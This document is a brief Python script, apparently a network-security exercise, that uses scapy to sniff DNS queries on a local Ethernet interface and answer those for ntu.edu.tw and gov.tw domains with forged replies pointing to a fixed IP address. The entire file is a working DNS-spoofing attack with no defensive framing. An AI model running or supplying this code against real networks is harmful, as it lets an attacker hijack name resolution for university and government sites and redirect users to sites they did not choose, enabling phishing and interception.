from scapy.all import *

test_list = ['ntu.edu.tw',
             'gov.tw'
                 ]

redirect_ip = ''

def banned_domain(domain):
    for d in test_list:
        if d in domain:
            return True
    return False

def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        print('[*] Detected DNS packet')
        ip_packet = pkt.getlayer(IP)
        udp_packet = pkt.getlayer(UDP)
        dns_packet = pkt.getlayer(DNS)
        test_domain = dns_packet.fields['qd'].fields['qname'].decode()[:-1]
        # test_domain in test_list
        if banned_domain(test_domain):
            resp = IP(src=ip_packet.dst, dst=ip_packet.src)
            resp /= UDP(sport=udp_packet.dport, dport=udp_packet.sport)
            resp /= DNS(id=dns_packet.id, qr=1, qd=dns_packet.qd, an=DNSRR(rrname=dns_packet.qd.qname, rdata='140.112.8.116'))
            send(resp)
            print('[+] Spoof finished')

interface_name = '乙太網路'
print('[*] Spoofing...')
sniff(filter='udp dst port 53', prn=dns_spoof, iface=interface_name)